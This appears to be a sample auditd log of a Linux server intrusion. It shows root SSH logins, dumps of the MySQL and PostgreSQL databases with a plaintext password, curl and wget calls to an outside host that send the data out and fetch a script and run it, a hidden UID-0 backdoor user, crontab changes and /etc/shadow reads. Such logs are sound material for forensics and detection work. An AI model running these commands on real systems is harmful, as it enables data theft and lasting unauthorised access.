@@ -1,0 +1,135 @@
+type=USER_LOGIN msg=audit(1790958613.000:1201): pid=1802 uid=0 auid=1000 ses=3 subj=unconfined msg='op=login id=1000 exe="/usr/sbin/sshd" hostname=? addr=10.0.0.15 terminal=/dev/pts/1 res=success'
+type=SYSCALL msg=audit(1790958665.000:1202): arch=c000003e syscall=59 success=yes exit=0 ppid=5651 pid=5652 auid=1000 uid=1000 gid=0 euid=1000 tty=pts1 ses=3 comm="sudo" exe="/usr/bin/sudo" key=(null)
+type=EXECVE msg=audit(1790958665.000:1202): argc=3 a0="sudo" a1="apt" a2="update"
+type=CWD msg=audit(1790958665.000:1202): cwd="/home/alice"
+type=PROCTITLE msg=audit(1790958665.000:1202): proctitle=7375646F0061707400757064617465
+type=SYSCALL msg=audit(1790958790.000:1203): arch=c000003e syscall=59 success=yes exit=0 ppid=4234 pid=4235 auid=1000 uid=1000 gid=0 euid=1000 tty=pts1 ses=3 comm="df" exe="/usr/bin/df" key=(null)
+type=EXECVE msg=audit(1790958790.000:1203): argc=2 a0="df" a1="-h"
+type=CWD msg=audit(1790958790.000:1203): cwd="/home/alice"
+type=PROCTITLE msg=audit(1790958790.000:1203): proctitle=6466002D68
+type=SYSCALL msg=audit(1790958842.000:1204): arch=c000003e syscall=59 success=yes exit=0 ppid=6233 pid=6234 auid=1000 uid=1000 gid=0 euid=1000 tty=pts1 ses=3 comm="ls" exe="/usr/bin/ls" key=(null)
+type=EXECVE msg=audit(1790958842.000:1204): argc=3 a0="ls" a1="-la" a2="/var/www"
+type=CWD msg=audit(1790958842.000:1204): cwd="/home/alice"
+type=PROCTITLE msg=audit(1790958842.000:1204): proctitle=6C73002D6C61002F7661722F777777
+type=SYSCALL msg=audit(1790960401.000:1205): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=812 auid=4294967295 uid=0 tty=(none) ses=4294967295 comm="run-parts" exe="/usr/bin/run-parts"
+type=EXECVE msg=audit(1790960401.000:1205): argc=2 a0="run-parts" a1="/etc/cron.hourly"
+type=USER_LOGIN msg=audit(1790961248.000:1206): pid=2211 uid=0 auid=0 ses=5 subj=unconfined msg='op=login id=0 exe="/usr/sbin/sshd" hostname=? addr=45.133.1.77 terminal=/dev/pts/1 res=success'
+type=SYSCALL msg=audit(1790961260.000:1207): arch=c000003e syscall=59 success=yes exit=0 ppid=6432 pid=6433 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="whoami" exe="/usr/bin/whoami" key=(null)
+type=EXECVE msg=audit(1790961260.000:1207): argc=1 a0="whoami"
+type=CWD msg=audit(1790961260.000:1207): cwd="/root"
+type=PROCTITLE msg=audit(1790961260.000:1207): proctitle=77686F616D69
+type=SYSCALL msg=audit(1790961265.000:1208): arch=c000003e syscall=59 success=yes exit=0 ppid=4180 pid=4181 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="id" exe="/usr/bin/id" key=(null)
+type=EXECVE msg=audit(1790961265.000:1208): argc=1 a0="id"
+type=CWD msg=audit(1790961265.000:1208): cwd="/root"
+type=PROCTITLE msg=audit(1790961265.000:1208): proctitle=6964
+type=SYSCALL msg=audit(1790961271.000:1209): arch=c000003e syscall=59 success=yes exit=0 ppid=7428 pid=7429 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="uname" exe="/usr/bin/uname" key=(null)
+type=EXECVE msg=audit(1790961271.000:1209): argc=2 a0="uname" a1="-a"
+type=CWD msg=audit(1790961271.000:1209): cwd="/root"
+type=PROCTITLE msg=audit(1790961271.000:1209): proctitle=756E616D65002D61
+type=SYSCALL msg=audit(1790961280.000:1210): arch=c000003e syscall=59 success=yes exit=0 ppid=3963 pid=3964 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="cat" exe="/usr/bin/cat" key=(null)
+type=EXECVE msg=audit(1790961280.000:1210): argc=2 a0="cat" a1="/etc/passwd"
+type=CWD msg=audit(1790961280.000:1210): cwd="/root"
+type=PROCTITLE msg=audit(1790961280.000:1210): proctitle=636174002F6574632F706173737764
+type=SYSCALL msg=audit(1790961292.000:1211): arch=c000003e syscall=59 success=yes exit=0 ppid=7675 pid=7676 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="ss" exe="/usr/bin/ss" key=(null)
+type=EXECVE msg=audit(1790961292.000:1211): argc=2 a0="ss" a1="-tlnp"
+type=CWD msg=audit(1790961292.000:1211): cwd="/root"
+type=PROCTITLE msg=audit(1790961292.000:1211): proctitle=7373002D746C6E70
+type=SYSCALL msg=audit(1790961310.000:1212): arch=c000003e syscall=59 success=yes exit=0 ppid=5526 pid=5527 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="ps" exe="/usr/bin/ps" key=(null)
+type=EXECVE msg=audit(1790961310.000:1212): argc=2 a0="ps" a1="aux"
+type=CWD msg=audit(1790961310.000:1212): cwd="/root"
+type=PROCTITLE msg=audit(1790961310.000:1212): proctitle=707300617578
+type=SYSCALL msg=audit(1790961311.000:1213): arch=c000003e syscall=59 success=yes exit=0 ppid=7588 pid=7589 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="grep" exe="/usr/bin/grep" key=(null)
+type=EXECVE msg=audit(1790961311.000:1213): argc=3 a0="grep" a1="-E" a2="mysql|postgres"
+type=CWD msg=audit(1790961311.000:1213): cwd="/root"
+type=PROCTITLE msg=audit(1790961311.000:1213): proctitle=67726570002D45006D7973716C7C706F737467726573
+type=SYSCALL msg=audit(1790961340.000:1214): arch=c000003e syscall=59 success=yes exit=0 ppid=8585 pid=8586 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="cat" exe="/usr/bin/cat" key=(null)
+type=EXECVE msg=audit(1790961340.000:1214): argc=2 a0="cat" a1="/var/www/html/wp-config.php"
+type=CWD msg=audit(1790961340.000:1214): cwd="/root"
+type=PROCTITLE msg=audit(1790961340.000:1214): proctitle=636174002F7661722F7777772F68746D6C2F77702D636F6E6669672E706870
+type=SYSCALL msg=audit(1790961390.000:1215): arch=c000003e syscall=59 success=yes exit=0 ppid=4479 pid=4480 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="mysql" exe="/usr/bin/mysql" key=(null)
+type=EXECVE msg=audit(1790961390.000:1215): argc=5 a0="mysql" a1="-uroot" a2="-pWp!2024db" a3="-e" a4=73686F7720646174616261736573
+type=CWD msg=audit(1790961390.000:1215): cwd="/root"
+type=PROCTITLE msg=audit(1790961390.000:1215): proctitle=6D7973716C002D75726F6F74002D70577021323032346462002D650073686F7720646174616261736573
+type=SYSCALL msg=audit(1790961482.000:1216): arch=c000003e syscall=59 success=yes exit=0 ppid=3843 pid=3844 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="mkdir" exe="/usr/bin/mkdir" key=(null)
+type=EXECVE msg=audit(1790961482.000:1216): argc=3 a0="mkdir" a1="-p" a2="/tmp/.x"
+type=CWD msg=audit(1790961482.000:1216): cwd="/root"
+type=PROCTITLE msg=audit(1790961482.000:1216): proctitle=6D6B646972002D70002F746D702F2E78
+type=SYSCALL msg=audit(1790961495.000:1217): arch=c000003e syscall=59 success=yes exit=0 ppid=7763 pid=7764 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="mysqldump" exe="/usr/bin/mysqldump" key=(null)
+type=EXECVE msg=audit(1790961495.000:1217): argc=4 a0="mysqldump" a1="-uroot" a2="-pWp!2024db" a3="--all-databases"
+type=CWD msg=audit(1790961495.000:1217): cwd="/root"
+type=PROCTITLE msg=audit(1790961495.000:1217): proctitle=6D7973716C64756D70002D75726F6F74002D70577021323032346462002D2D616C6C2D646174616261736573
+type=SYSCALL msg=audit(1790961496.000:1218): arch=c000003e syscall=59 success=yes exit=0 ppid=7678 pid=7679 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="gzip" exe="/usr/bin/gzip" key=(null)
+type=EXECVE msg=audit(1790961496.000:1218): argc=1 a0="gzip"
+type=CWD msg=audit(1790961496.000:1218): cwd="/root"
+type=PROCTITLE msg=audit(1790961496.000:1218): proctitle=677A6970
+type=SYSCALL msg=audit(1790961760.000:1219): arch=c000003e syscall=59 success=yes exit=0 ppid=8232 pid=8233 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="sudo" exe="/usr/bin/sudo" key=(null)
+type=EXECVE msg=audit(1790961760.000:1219): argc=5 a0="sudo" a1="-u" a2="postgres" a3="pg_dump" a4="crm"
+type=CWD msg=audit(1790961760.000:1219): cwd="/root"
+type=PROCTITLE msg=audit(1790961760.000:1219): proctitle=7375646F002D7500706F7374677265730070675F64756D700063726D
+type=SYSCALL msg=audit(1790961761.000:1220): arch=c000003e syscall=59 success=yes exit=0 ppid=4538 pid=4539 auid=0 uid=105 gid=0 euid=105 tty=pts1 ses=5 comm="pg_dump" exe="/usr/bin/pg_dump" key=(null)
+type=EXECVE msg=audit(1790961761.000:1220): argc=2 a0="pg_dump" a1="crm"
+type=CWD msg=audit(1790961761.000:1220): cwd="/root"
+type=PROCTITLE msg=audit(1790961761.000:1220): proctitle=70675F64756D700063726D
+type=SYSCALL msg=audit(1790961845.000:1221): arch=c000003e syscall=59 success=yes exit=0 ppid=6049 pid=6050 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="tar" exe="/usr/bin/tar" key=(null)
+type=EXECVE msg=audit(1790961845.000:1221): argc=4 a0="tar" a1="czf" a2="/tmp/.x/www.tgz" a3="/var/www/html"
+type=CWD msg=audit(1790961845.000:1221): cwd="/root"
+type=PROCTITLE msg=audit(1790961845.000:1221): proctitle=74617200637A66002F746D702F2E782F7777772E74677A002F7661722F7777772F68746D6C
+type=SYSCALL msg=audit(1790961846.000:1222): arch=c000003e syscall=59 success=yes exit=0 ppid=3797 pid=3798 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="gzip" exe="/usr/bin/gzip" key=(null)
+type=EXECVE msg=audit(1790961846.000:1222): argc=1 a0="gzip"
+type=CWD msg=audit(1790961846.000:1222): cwd="/root"
+type=PROCTITLE msg=audit(1790961846.000:1222): proctitle=677A6970
+type=SYSCALL msg=audit(1790961930.000:1223): arch=c000003e syscall=59 success=yes exit=0 ppid=7486 pid=7487 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="curl" exe="/usr/bin/curl" key=(null)
+type=EXECVE msg=audit(1790961930.000:1223): argc=6 a0="curl" a1="-T" a2="/tmp/.x/db.sql.gz" a3="ftp://185.220.101.4/up/" a4="--user" a5="anon:anon"
+type=CWD msg=audit(1790961930.000:1223): cwd="/root"
+type=PROCTITLE msg=audit(1790961930.000:1223): proctitle=6375726C002D54002F746D702F2E782F64622E73716C2E677A006674703A2F2F3138352E3232302E3130312E342F75702F002D2D7573657200616E6F6E3A616E6F6E
+type=SYSCALL msg=audit(1790962020.000:1224): arch=c000003e syscall=59 success=yes exit=0 ppid=8832 pid=8833 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="wget" exe="/usr/bin/wget" key=(null)
+type=EXECVE msg=audit(1790962020.000:1224): argc=5 a0="wget" a1="-q" a2="http://185.220.101.4/k.sh" a3="-O" a4="/tmp/.x/k.sh"
+type=CWD msg=audit(1790962020.000:1224): cwd="/root"
+type=PROCTITLE msg=audit(1790962020.000:1224): proctitle=77676574002D7100687474703A2F2F3138352E3232302E3130312E342F6B2E7368002D4F002F746D702F2E782F6B2E7368
+type=SYSCALL msg=audit(1790962030.000:1225): arch=c000003e syscall=59 success=yes exit=0 ppid=3513 pid=3514 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="chmod" exe="/usr/bin/chmod" key=(null)
+type=EXECVE msg=audit(1790962030.000:1225): argc=3 a0="chmod" a1="+x" a2="/tmp/.x/k.sh"
+type=CWD msg=audit(1790962030.000:1225): cwd="/root"
+type=PROCTITLE msg=audit(1790962030.000:1225): proctitle=63686D6F64002B78002F746D702F2E782F6B2E7368
+type=SYSCALL msg=audit(1790962035.000:1226): arch=c000003e syscall=59 success=yes exit=0 ppid=7622 pid=7623 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="k.sh" exe="/tmp/.x/k.sh" key=(null)
+type=EXECVE msg=audit(1790962035.000:1226): argc=1 a0="/tmp/.x/k.sh"
+type=CWD msg=audit(1790962035.000:1226): cwd="/root"
+type=PROCTITLE msg=audit(1790962035.000:1226): proctitle=2F746D702F2E782F6B2E7368
+type=SYSCALL msg=audit(1790962120.000:1227): arch=c000003e syscall=59 success=yes exit=0 ppid=3487 pid=3488 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="useradd" exe="/usr/bin/useradd" key=(null)
+type=EXECVE msg=audit(1790962120.000:1227): argc=10 a0="useradd" a1="-o" a2="-u" a3="0" a4="-g" a5="0" a6="-M" a7="-s" a8="/bin/bash" a9="sysupd"
+type=CWD msg=audit(1790962120.000:1227): cwd="/root"
+type=PROCTITLE msg=audit(1790962120.000:1227): proctitle=75736572616464002D6F002D750030002D670030002D4D002D73002F62696E2F6261736800737973757064
+type=SYSCALL msg=audit(1790962132.000:1228): arch=c000003e syscall=59 success=yes exit=0 ppid=8069 pid=8070 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="chpasswd" exe="/usr/bin/chpasswd" key=(null)
+type=EXECVE msg=audit(1790962132.000:1228): argc=1 a0="chpasswd"
+type=CWD msg=audit(1790962132.000:1228): cwd="/root"
+type=PROCTITLE msg=audit(1790962132.000:1228): proctitle=6368706173737764
+type=SYSCALL msg=audit(1790962205.000:1229): arch=c000003e syscall=59 success=yes exit=0 ppid=4686 pid=4687 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="crontab" exe="/usr/bin/crontab" key=(null)
+type=EXECVE msg=audit(1790962205.000:1229): argc=2 a0="crontab" a1="-l"
+type=CWD msg=audit(1790962205.000:1229): cwd="/root"
+type=PROCTITLE msg=audit(1790962205.000:1229): proctitle=63726F6E746162002D6C
+type=SYSCALL msg=audit(1790962206.000:1230): arch=c000003e syscall=59 success=yes exit=0 ppid=7065 pid=7066 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="crontab" exe="/usr/bin/crontab" key=(null)
+type=EXECVE msg=audit(1790962206.000:1230): argc=2 a0="crontab" a1="-"
+type=CWD msg=audit(1790962206.000:1230): cwd="/root"
+type=PROCTITLE msg=audit(1790962206.000:1230): proctitle=63726F6E746162002D
+type=USER_LOGIN msg=audit(1790962863.000:1231): pid=2390 uid=0 auid=0 ses=6 subj=unconfined msg='op=login id=0 exe="/usr/sbin/sshd" hostname=? addr=45.133.1.77 terminal=/dev/pts/1 res=success'
+type=USER_LOGIN msg=audit(1790963131.000:1232): pid=2420 uid=0 auid=0 ses=7 subj=unconfined msg='op=login id=0 exe="/usr/sbin/sshd" hostname=? addr=45.133.1.77 terminal=/dev/pts/1 res=success'
+type=SYSCALL msg=audit(1790963131.000:1233): arch=c000003e syscall=59 success=yes exit=0 ppid=8572 pid=8573 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=7 comm="scp" exe="/usr/bin/scp" key=(null)
+type=EXECVE msg=audit(1790963131.000:1233): argc=3 a0="scp" a1="-f" a2="/tmp/.x/db.sql.gz"
+type=CWD msg=audit(1790963131.000:1233): cwd="/root"
+type=PROCTITLE msg=audit(1790963131.000:1233): proctitle=736370002D66002F746D702F2E782F64622E73716C2E677A
+type=USER_LOGIN msg=audit(1790963411.000:1234): pid=2501 uid=0 auid=0 ses=8 subj=unconfined msg='op=login id=0 exe="/usr/sbin/sshd" hostname=? addr=91.240.118.5 terminal=/dev/pts/1 res=success'
+type=SYSCALL msg=audit(1790963420.000:1235): arch=c000003e syscall=59 success=yes exit=0 ppid=7354 pid=7355 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm="id" exe="/usr/bin/id" key=(null)
+type=EXECVE msg=audit(1790963420.000:1235): argc=1 a0="id"
+type=CWD msg=audit(1790963420.000:1235): cwd="/root"
+type=PROCTITLE msg=audit(1790963420.000:1235): proctitle=6964
+type=SYSCALL msg=audit(1790963431.000:1236): arch=c000003e syscall=59 success=yes exit=0 ppid=6501 pid=6502 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm="cat" exe="/usr/bin/cat" key=(null)
+type=EXECVE msg=audit(1790963431.000:1236): argc=2 a0="cat" a1="/etc/shadow"
+type=CWD msg=audit(1790963431.000:1236): cwd="/root"
+type=PROCTITLE msg=audit(1790963431.000:1236): proctitle=636174002F6574632F736861646F77
+type=SYSCALL msg=audit(1790963462.000:1237): arch=c000003e syscall=59 success=yes exit=0 ppid=5572 pid=5573 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm="ls" exe="/usr/bin/ls" key=(null)
+type=EXECVE msg=audit(1790963462.000:1237): argc=3 a0="ls" a1="-la" a2="/tmp/.x"
+type=CWD msg=audit(1790963462.000:1237): cwd="/root"
+type=PROCTITLE msg=audit(1790963462.000:1237): proctitle=6C73002D6C61002F746D702F2E78
+type=SYSCALL msg=audit(1790963500.000:1238): arch=c000003e syscall=59 success=yes exit=0 ppid=6813 pid=6814 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=8 comm="python3" exe="/usr/bin/python3" key=(null)
+type=EXECVE msg=audit(1790963500.000:1238): argc=3 a0="python3" a1="-c" a2=696D706F7274207074793B7074792E737061776E28222F62696E2F626173682229
+type=CWD msg=audit(1790963500.000:1238): cwd="/root"
+type=PROCTITLE msg=audit(1790963500.000:1238): proctitle=707974686F6E33002D6300696D706F7274207074793B7074792E737061776E28222F62696E2F626173682229
